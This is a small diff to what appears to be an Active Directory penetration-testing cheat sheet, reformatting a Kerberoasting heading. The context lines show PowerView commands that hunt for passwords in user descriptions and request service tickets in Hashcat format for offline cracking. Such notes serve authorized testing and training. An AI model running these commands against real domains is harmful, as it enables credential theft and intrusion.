@@ -319,7 +319,9 @@ Get-ADGroupMember -Identity <groupname>
 Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
 ```
 
-Kerberoasting - get user TGS ticket
+Kerberoasting 
+
+get user TGS ticket
 
 ```powershell
 Get-DomainUser -Identity <AD account> | Get-DomainSPNTicket -Format Hashcat
